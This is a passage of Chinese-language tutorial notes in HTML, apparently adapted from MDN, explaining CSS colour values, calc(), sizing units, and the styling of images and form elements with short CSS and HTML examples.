的值</strong></p><p>我们将在这里讨论的第三种方案是 RGB。RGB 值是一个函数—RGB()—它有三个参数，表示颜色的红色、绿色和蓝色通道值，与十六进制值的方法非常相似。RGB 的不同之处在于，每个通道不是由两个十六进制数字表示的，而是由一个介于 0 到 255 之间的十进制数字表示的——这有点容易理解。</p><p>你还可以使用 RGBA 颜色——它们的工作方式与 RGB 颜色完全相同，因此你可以使用任何 RGB 值，但是有第四个值表示颜色的 alpha 通道，它控制不透明度。如果将这个值设置为<code>0</code>，它将使颜色完全透明，而设置为<code>1</code>将使颜色完全不透明。介于两者之间的值提供了不同级别的透明度。</p><p><strong>备注：</strong> 在颜色上设置 alpha 通道与使用我们前面看到的<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/opacity"><code>opacity</code></a>属性有一个关键区别。当你使用不透明度时，你让元素和它里面的所有东西都不透明，而使用 RGBA 颜色只让你指定的颜色不透明。</p><h4 id="HSL-和-HSLA-的值"><a href="#HSL-和-HSLA-的值" class="headerlink" title="HSL 和 HSLA 的值"></a>HSL 和 HSLA 的值</h4><p>与 RGB 相比，HSL 颜色模型的支持稍差一些 (在旧版本的 IE 中不支持)，它是在设计师们感兴趣之后实现的。<code>hsl()</code> 函数接受色调、饱和度和亮度值作为参数，而不是红色、绿色和蓝色值，这些值的不同方式组合，可以区分 1670 万种颜色：</p><ul><li><strong>色调</strong>：颜色的底色。这个值在 0 和 360 之间，表示色轮周围的角度。</li><li><strong>饱和度</strong>：颜色有多饱和？它的值为 0 - 100%，其中 0 为无颜色 (它将显示为灰色阴影)，100% 为全色饱和度</li><li><strong>亮度</strong>：颜色有多亮？它从 0 - 100% 中获取一个值，其中 0 表示没有光 (它将完全显示为黑色)，100% 表示完全亮 (它将完全显示为白色)</li></ul><p>就像 RGB 有 RGBA 一样，HSL 也有 HSLA 等效物，它使你能够指定 alpha 通道值。我已经在下面通过将 RGBA 示例更改为使用 HSLA 颜色来演示了这一点。</p><p>你可以在项目中使用这些颜色值中的任何一个。对于大多数项目，你可能会选择一个调色板，然后在整个项目中使用这些颜色——以及你所选择的定义这些颜色的方法。你可以混合使用不同的颜色模型，但是为了一致性，通常最好是你的整个项目使用相同的一个！</p><h4 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h4><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/image"><code>&lt;image&gt;</code></a> 数据类型用于图像为有效值的任何地方。它可以是一个通过 <code>url()</code>函数指向的实际图像文件，也可以是一个渐变。</p><p>在下面的例子中，我们演示了一个图像和一个渐变作为 CSS <code>background-image</code>属性的值。</p><h4 id="位置"><a href="#位置" class="headerlink" title="位置"></a>位置</h4><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/position_value"><code>&lt;position&gt;</code></a> 数据类型表示一组 2D 坐标，用于定位一个元素，如背景图像 (通过 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/background-position"><code>background-position</code></a>)。它可以使用关键字 (如 <code>top</code>, <code>left</code>, <code>bottom</code>, <code>right</code>, 以及<code>center</code> ) 将元素与 2D 框的特定边界对齐，以及表示框的顶部和左侧边缘偏移量的长度。</p><p>一个典型的位置值由两个值组成——第一个值水平地设置位置，第二个值垂直地设置位置。如果只指定一个轴的值，另一个轴将默认为 <code>center</code>。</p><p>在下面的示例中，我们使用关键字将背景图像从容器的顶部到右侧放置了 40px。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.box</span> &#123;<br>  <span class="hljs-attribute">height</span>: <span class="hljs-number">300px</span>;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">400px</span>;<br>  <span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">star.png</span>);<br>  <span class="hljs-attribute">background-repeat</span>: no-repeat;<br>  <span class="hljs-attribute">background-position</span>: right <span class="hljs-number">40px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="字符串和标识符"><a href="#字符串和标识符" class="headerlink" title="字符串和标识符"></a>字符串和标识符</h4><p>在上面的示例中，我们看到关键字被用作值的地方 (例如<code>&lt;color&gt;</code>关键字，如 <code>red</code>, <code>black</code>, <code>rebeccapurple</code>, and <code>goldenrod</code>)。这些关键字被更准确地描述为标识符，一个 CSS 可以理解的特殊值。因此它们没有使用引号括起来——它们不被当作字符串。</p><p>在某些地方可以使用 CSS 中的字符串，例如 <a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS/Building_blocks/Selectors/Pseudo-classes_and_pseudo-elements#generating_content_with_before_and_after">在指定生成的内容时</a>。在本例中，引用该值以证明它是一个字符串。在下面的示例中，我们使用非引号括起来的颜色关键字和引号括起来的内容字符串。</p><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p>我们将查看的最后一种类型的值是一组称为函数的值。在编程中，函数是一段可重用的代码，可以多次运行，以完成重复的任务，对开发人员和计算机都是如此。函数通常与 JavaScript、Python 或 c++等语言相关联，但它们也以属性值的形式存在于 CSS 中。我们已经在颜色部分看到了函数的作用——<code>rgb()</code>、<code>hsl()</code>等。用于从文件返回图像的值——<code>url()</code>——也是一个函数。</p><p>行为更类似于传统编程语言的值是<code>calc()</code>函数。这个函数使你能够在 CSS 中进行简单的计算。如果你希望计算出在为项目编写 CSS 时无法定义的值，并且需要浏览器在运行时为你计算出这些值，那么它特别有用。</p><p>例如，下面我们使用<code>calc()</code>使框宽为 20% + 100px。20% 是根据父容器.wrapper 的宽度来计算的，因此如果宽度改变，它也会改变。我们不能事先做这个计算，因为我们不知道父类的 20% 是多少，所以我们使用<code>calc()</code>来告诉浏览器为我们做这个计算。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.wrapper</span> &#123;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">400px</span>;<br>&#125;<br><br><span class="hljs-selector-class">.box</span> &#123;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-built_in">calc</span>(<span class="hljs-number">20%</span> + <span class="hljs-number">100px</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-7-在css中调整大小"><a href="#2-7-在css中调整大小" class="headerlink" title="2.7 在css中调整大小"></a>2.7 在css中调整大小</h3><p>在前面的课程中你已经看到了几种使用 CSS 为页面中元素设定尺寸的方法。在我们设计网页的时候，需要理解这些不同方法之间的差异。在本课程中，我们将总结设定元素尺寸的方法，并定义几个术语，这些内容将会在未来对你有所帮助。</p><h4 id="原始尺寸，或固有尺寸"><a href="#原始尺寸，或固有尺寸" class="headerlink" title="原始尺寸，或固有尺寸"></a>原始尺寸，或固有尺寸</h4><p>一个空的<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/div"><code>&lt;div&gt;</code></a>是没有尺寸的。如果你在你的 HTML 文件中添加一个空<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/div"><code>&lt;div&gt;</code></a>并给予其边框（就像刚才我们为图像做的那样），你会在页面上看到一条线。这是边框被压缩后的效果— 它内部没有内容。在我们下面的例子中，边框宽度扩展到整个容器宽度，因为它是块级元素，而块级元素的行为就是这样的。它没有高度，或者说高度为 0，因为内部没有内容。</p><p>在上面的例子中，试着在空元素内部添加些内容。现在边框内包含一些文字了，因为元素的高度由其所含内容高度确定。再强调一次，这就是元素的固有尺寸 — 由其所包含的内容决定。</p><h4 id="设置具体的尺寸"><a href="#设置具体的尺寸" class="headerlink" title="设置具体的尺寸"></a>设置具体的尺寸</h4><p>我们当然可以给设计中的元素指定具体大小。当给元素指定尺寸（然后其内容需要适合该尺寸）时，我们将其称为<strong>外部尺寸</strong>。以上面例子中的 <code>&lt;div&gt;</code> 举例 — 我们可以给它一个具体的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/width"><code>width</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/height"><code>height</code></a> 值，然后不论我们放什么内容进去它都是该尺寸。正如我们在<a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS/Building_blocks/Overflowing_content">上一课</a>有关溢出的内容中所发现的，如果内容的数量超出了元素可容纳的空间，则设置的高度会导致内容溢出。</p><p>由于存在溢出问题，在网络上使用长度或百分比固定元素的高度需要非常小心。</p><h4 id="使用百分数"><a href="#使用百分数" class="headerlink" title="使用百分数"></a>使用百分数</h4><p>许多时候，百分数是长度单位，正如我们在<a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS/Building_blocks/Values_and_units#percentages">Value and units 这节课中讨论的那样</a>，它们常常可与长度互换。当使用百分数时，你需要清楚，它是<strong>什么</strong>东西的百分数。对于一个处于另外一个容器当中的盒子，如果你给予了子盒子一个百分数作为宽度，那么它指的是父容器宽度的百分数。</p><p>这是因为百分数是以包含盒子的块为根据解析的。如果我们的<code>&lt;div&gt;</code>没有被指定百分数的值，那么它会占据 100% 的可用空间，因为它是块级别的元素。如果我们给了它一个百分数作为宽度，那么这就是它原来情况下可以占据空间的百分数。</p><h4 id="把百分数作为内外边距"><a href="#把百分数作为内外边距" class="headerlink" title="把百分数作为内外边距"></a>把百分数作为内外边距</h4><p>如果你把<code>margins</code>和<code>padding</code>设置为百分数的话，你会注意到一些奇怪的表现。在下面的例子里，我们有一个盒子，我们给了里面的盒子 10% 的<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/margin"><code>margin</code></a>以及 10% 的<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/padding"><code>padding</code></a>。盒子底部和顶部的内外边距，和左右外边距有同样的大小。</p><p>或许，你期望元素的上下外边距是其高度的百分比，元素的左右外边距是其宽度的百分比。但情况并非如此！</p><p>使用百分比作为元素外边距（margin）或填充（padding）的单位时，值是以包含块的<strong>内联尺寸</strong>进行计算的，也就是元素的水平宽度。在我们的示例中，所有的外边距或填充都是宽度的 10%。请记住一个事实，当你使用百分比作为元素外边距或填充的单位时，你将得到一个相同尺寸的外边距或填充。</p><h4 id="min-和max-尺寸"><a href="#min-和max-尺寸" class="headerlink" title="min-和max-尺寸"></a>min-和max-尺寸</h4><p>除了让万物都有一个确定的大小以外，我们可以让 CSS 给定一个元素的最大或最小尺寸。如果你有一个包含了变化容量的内容的盒子，而且你总是想让它<strong>至少</strong>有个确定的高度，你应该给它设置一个<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/min-height"><code>min-height</code></a>属性。盒子就会一直保持大于这个最小高度，但是如果有比这个盒子在最小高度状态下所能容纳的更多内容，那么盒子就会变大。</p><p>在以下的示例中，你可以看到两个盒子，两个都有 150 像素的确定高度，左边的盒子有 150 像素高，右边的盒子有需要更多空间才能装下的内容，所以它变得比 150 像素高。</p><p>这在避免溢出的同时并处理变化容量的内容的时候是很有用的。</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/max-width"><code>max-width</code></a>的常见用法为，在没有足够空间以原有宽度展示图像时，让图像缩小，同时确保它们不会比这一宽度大。</p><p>作为示例，如果你设定一个图像的属性为<code>width: 100%</code>，而且它的原始宽度小于容器，图像会被强制拉伸以变大，看起来像素更加明显。如果它的原始宽度大于容器，它则会溢出。两种情形都不是你想要看到的。</p><p>如果你使用了<code>max-width: 100%</code>，那么图像可以变得比原始尺寸更小，但是不会大于原始尺寸的 100%。</p><p>在下面的示例里，我们使用了两次相同的图片。第一次使用，属性值已设为<code>width: 100%</code>，位于比图片大的容器里，因此图片拉伸到了与容器相同的宽度；第二次的属性值则设为<code>max-width: 100%</code>，因此它并没有拉伸到充满容器；第三个盒子再一次包含了相同的图片，同时设定了<code>max-width: 100%</code>属性，这时你能看到它是怎样缩小来和盒子大小相适应的。</p><p>这个技术是用来让图片<strong>可响应</strong>的，所以在更小的设备上浏览的时候，它们会合适地缩放。你无论怎样都不应该用这个技术先载入大原始尺寸的图片，再对它们在浏览器中进行缩放。图像应该合适地调整尺寸，以使它们不会比预计中展示时所需要的最大尺寸大。下载过大的图像会造成你的网站变慢，如果用户使用按量收费的网络连接，会让用户花更多钱。</p><p><strong>备注：</strong>了解更多关于<a href="https://developer.mozilla.org/zh-CN/docs/Learn/HTML/Multimedia_and_embedding/Responsive_images">响应式图片技术</a>的事情。</p><h4 id="视口单位"><a href="#视口单位" class="headerlink" title="视口单位"></a>视口单位</h4><p>视口，即你在浏览器中看到的部分页面，也是有尺寸的。在 CSS 中，我们有与视口尺寸相关的度量单位，即意为视口宽度的<code>vw</code>单位，以及意为视口高度的 <code>vh</code>单位。使用这些单位，你可以把一些东西做得随用户的视口改变大小。</p><p><code>1vh</code>等于视口高度的 1%，<code>1vw</code>则为视口宽度的 1%.你可以用这些单位约束盒子的大小，还有文字的大小。在下面的示例里，我们有一个大小被设为 20vh 和 20vw 的盒子。这个盒子里面有一个字母<code>A</code>，其<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/font-size"><code>font-size</code></a>属性被设成了 10vh。</p><p><strong>如果你改变了<code>vh</code>和<code>vw</code>的对应值，盒子和字体的大小也会改变；视口大小的变化也会让它们的大小变化，因为它们是依照视口来定大小的。想看到随着你改变视口大小的时候示例的变化的话，你需要在一个新浏览器视窗里面载入此示例，因为你可以控制该视窗的大小，同时上面示例所在的嵌入的<code>&lt;iframe&gt;</code>的大小即是对上面示例而言的视口。<a href="https://mdn.github.io/css-examples/learn/sizing/vw-vh.html">打开此示例</a>，调整浏览器视窗的大小，观察在盒子和文本的大小上所发生的事情。</strong></p><p>在你的设计中，根据视口改变物件的大小是很有用的。例如，如果你想要在你其他内容之前，有一个充满整个视口的视觉宣传段落，让你的页面的那个部分有 100vh 高的话，会把剩下的内容推到视口的下面，只有向下滚动文档的时候它们才会出现。</p><h3 id="2-8-图像、媒体和表单元素"><a href="#2-8-图像、媒体和表单元素" class="headerlink" title="2.8 图像、媒体和表单元素"></a>2.8 图像、媒体和表单元素</h3><p>在这节课里，我们来看一下，CSS 是如何处理某些特殊元素的。图像、其他媒体和表格元素的表现和普通的盒子有些不同，这取决于你使用 CSS 格式化它们的能力。理解什么可能做到，什么不可能做到能够省些力气，本节课将会聚焦于一些你需要知道的主要的事情上。</p><h4 id="替换元素"><a href="#替换元素" class="headerlink" title="替换元素"></a>替换元素</h4><p>图像和视频被描述为**<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Replaced_element">替换元素</a>**。这意味着 CSS 不能影响它们的内部布局——而仅影响它们在页面上相对于其它元素的位置。但是，正如我们将看到的，CSS 可以对图像执行多种操作。</p><p>某些替换元素（例如图像和视频）也具有<strong>宽高比</strong>。这意味着它在水平（x）和垂直（y）方向上均具有大小，并且默认情况下将使用文件的固有尺寸进行显示。</p><h4 id="调整图像大小"><a href="#调整图像大小" class="headerlink" title="调整图像大小"></a>调整图像大小</h4><p>正如你从之前的几节课中所学到的那样，CSS 中万物皆盒。如果你把一张图片放在一个盒子里，而这张图片的原始长和宽比盒子的小或大，那么这张图要么缩在盒子里，要么就从盒子里面溢出。你需要决定如何处理这样的溢出。</p><p>下面的示例中有两个盒子，长宽均为 200 像素：</p><ul><li>一个包含了一张小于 200 像素的图像，它比盒子小，并且不会自动拉伸来充满盒子。</li><li>另一张图像大于 200 像素，溢出了盒子。</li></ul><p>那么该如何处理溢出问题呢？</p><p>正如我们在<a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS/Building_blocks/Sizing_items_in_CSS">之前的课程</a> 所学的那样，一个常用的方法是将一张图片的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/max-width"><code>max-width</code></a> 设为 100%。这将会使图片的尺寸小于等于盒子。这个技术也会对其他替换元素（例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/video"><code>&lt;video&gt;</code></a>，或者 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/iframe"><code>&lt;iframe&gt;</code></a>。</p><p>你可以选择对容器内的图像作其它方式的处理。例如，你可能想把一张图像调整到能够完全盖住一个盒子的大小。</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/object-fit"><code>object-fit</code></a> 属性可以在这里帮助你。当使用 <code>object-fit</code> 时，替换元素可以以多种方式被调整到合乎盒子的大小。</p><p>如果我们使用值 <code>contain</code>，图像就会被缩放到足以完整地放到盒子里面的大小。如果它和盒子的比例不同，将会出现“开天窗”的结果。</p><p>你可能也想试试 <code>fill</code> 值，它可以让图像充满盒子，但是不会维持比例。</p><h4 id="布局中的替换元素"><a href="#布局中的替换元素" class="headerlink" title="布局中的替换元素"></a>布局中的替换元素</h4><p>在对替换元素使用各种 CSS 布局时，你可能会发现他们的表现方式与其他元素有一些细节上的差异。例如，flex 或者 grid 布局中，默认情况下元素会被拉伸到充满整块区域。但是图像不会被拉伸，而会对齐到网格区域或者弹性容器的起始处。</p><p>你可以在下面的示例中看到这一现象。该示例有一个两列两行的网格容器，里面有四个物件。所有的 <code>&lt;div&gt;</code> 元素有自己的背景色，被拉伸到充满了行和列。但是，图像并没有被拉伸。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;wrapper&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;star.png&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;star&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.wrapper</span> &#123;<br>  <span class="hljs-attribute">display</span>: grid;<br>  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr;<br>  <span class="hljs-attribute">grid-template-rows</span>: <span class="hljs-number">200px</span> <span class="hljs-number">200px</span>;<br>  <span class="hljs-attribute">gap</span>: <span class="hljs-number">20px</span>;<br>&#125;<br><br><span class="hljs-selector-class">.wrapper</span> &gt; <span class="hljs-selector-tag">div</span> &#123;<br>  <span class="hljs-attribute">background-color</span>: rebeccapurple;<br>  <span class="hljs-attribute">border-radius</span>: .<span class="hljs-number">5em</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20230225195135107-20230305%2010:52:41.png" alt="image-20230225195135107"></p><p>如果你是按序阅读这些课程的，那么你可能还没有看到布局的部分。不过没关系，只要记住替换元素在成为网格或者弹性布局的一部分时，有不同的默认行为就好了。这一默认行为很有必要，因为它避免了替换元素被布局拉伸成奇怪的样子。</p><p>为了强制图像拉伸，以充满其所在的网格单元，你必须做类似于下面的事情：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">img</span> &#123;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;<br>  <span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这将会无条件地拉伸图像，所以很可能不会是你想要的。</p><h4 id="form-元素"><a href="#form-元素" class="headerlink" title="form 元素"></a>form 元素</h4><p>用 CSS 格式化表单元素是一个需要技巧的工作，<a href="https://developer.mozilla.org/zh-CN/docs/Learn/Forms">HTML 表单指南</a>包含了详细的格式化表单元素的指导，我不会在这里复述。本节需要介绍的是一些值得关注的关键基础内容。</p><p>很多表单控件是通过 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/input"><code>&lt;form&gt;</code></a> 元素添加到网页上的。该元素定义了简单的表单区域，例如文字输入。更进一步还有 HTML5 新加入的更加复杂的区域，例如颜色和日期撷取器。另外还有一些其他元素，例如用于多行文本输入的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/textarea"><code>&lt;textarea&gt;</code></a>，以及那些用来包含和标记表单特定部分的元素，例如<code>&lt;fieldset&gt;</code>和 <code>&lt;legend&gt;</code> 。</p><p>HTML5 还包含了允许 Web 开发者指定必填区域的特性，甚至还能检验填入内容的类型。如果用户输入了一些不符合要求的内容，或者未填写必填区域，浏览器会显示错误提示。不同的浏览器在给此类元素样式化和自定义方面不尽相同。</p><h4 id="样式化文本输入元素"><a href="#样式化文本输入元素" class="headerlink" title="样式化文本输入元素"></a>样式化文本输入元素</h4><p>允许文本输入的元素有很多，例如 <code>&lt;input type=&quot;text&quot;&gt;</code>，及其指定特定类型的元素，如 <code>&lt;input type=&quot;email&quot;&gt;</code> 以及 <code>&lt;textarea&gt;</code> 元素，这些都是相当容易样式化的，它们和页面上其他盒子的表现相同。只不过在不同的操作系统和浏览器上访问时这些元素默认的样式化方式可能不同。</p><p>在下面的示例中，我们已经将一些文本输入元素用 CSS 样式化了。可以看到，边框、内外边距之类的东西都如期生效了。现在，我们使用属性选择器来指向不同的输入类型，尝试通过改变边框、添加输入区域背景色、改变字体和内边距的方式来改变表单的外观。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;name&quot;</span>&gt;</span>Name<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;name&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;email&quot;</span>&gt;</span>Email<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;email&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;buttons&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[type=<span class="hljs-string">&quot;text&quot;</span>]</span>,<br><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[type=<span class="hljs-string">&quot;email&quot;</span>]</span> &#123;<br>  <span class="hljs-attribute">border</span>: <span class="hljs-number">2px</span> solid <span class="hljs-number">#000</span>;<br>  <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">1em</span> <span class="hljs-number">0</span>;<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;<br>&#125;<br><br><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[type=<span class="hljs-string">&quot;submit&quot;</span>]</span> &#123;<br>  <span class="hljs-attribute">border</span>: <span class="hljs-number">3px</span> solid <span class="hljs-number">#333</span>;<br>  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#999</span>;<br>  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">5px</span>;<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span> <span class="hljs-number">2em</span>;<br>  <span class="hljs-attribute">font-weight</span>: bold;<br>  <span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;<br>&#125;<br><br><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[type=<span class="hljs-string">&quot;submit&quot;</span>]</span><span class="hljs-selector-pseudo">:hover</span>, <span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[type=<span class="hljs-string">&quot;submit&quot;</span>]</span><span class="hljs-selector-pseudo">:focus</span> &#123;<br>  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#333</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>警告：</strong> 你应该谨慎改变表单样式，确保用户仍然能轻松辨认表单元素。原则上，你可以创建一个没有边框和背景的，几乎无法与周围的内容区分开来的输入表单，但这会使辨认和填写变得非常困难。</p><h4 id="继承和表单元素"><a href="#继承和表单元素" class="headerlink" title="继承和表单元素"></a>继承和表单元素</h4><p>在一些浏览器中，表单元素默认不会继承字体样式，因此如果你想要确保你的表单填入区域使用 body 中或者一个父元素中定义的字体，你需要向你的 CSS 中加入这条规则。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">button</span>,<br><span class="hljs-selector-tag">input</span>,<br>select,<br><span class="hljs-selector-tag">textarea</span> &#123;<br>  <span class="hljs-attribute">font-family</span> : inherit;<br>  <span class="hljs-attribute">font-size</span> : <span class="hljs-number">100%</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="form-元素与-box-sizing"><a href="#form-元素与-box-sizing" class="headerlink" title="form 元素与 box-sizing"></a>form 元素与 box-sizing</h4><p>跨浏览器的 form 元素对于不同的挂件使用不同的盒子约束规则。你已经在我们的<a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS/Building_blocks/The_box_model">盒模型课</a>中学习了 <code>box-sizing</code> 属性，在样式化表单时候，你可以使用这一知识，确保在给 form 元素设定宽度和高度时可以有统一的体验。</p><p>为了保证统一，最好将所有元素的内外边距都设为 <code>0</code>，然后在单独进行样式化控制的时候将这些加回来。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">button</span>,<br><span class="hljs-selector-tag">input</span>,<br>select,<br><span class="hljs-selector-tag">textarea</span> &#123;<br>  <span class="hljs-attribute">box-sizing</span>: border-box;<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>;<br>  <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="其他有用的设置"><a href="#其他有用的设置" class="headerlink" title="其他有用的设置"></a>其他有用的设置</h4><p>除了上面提到的规则以外，你也应该在 <code>&lt;textarea&gt;</code> 上设置 <code>overflow: auto</code> 以避免 IE 在不需要滚动条的时候显示滚动条：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">textarea</span> &#123;<br>  <span class="hljs-attribute">overflow</span>: auto;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="将一切都放在一起“重置”"><a href="#将一切都放在一起“重置”" class="headerlink" 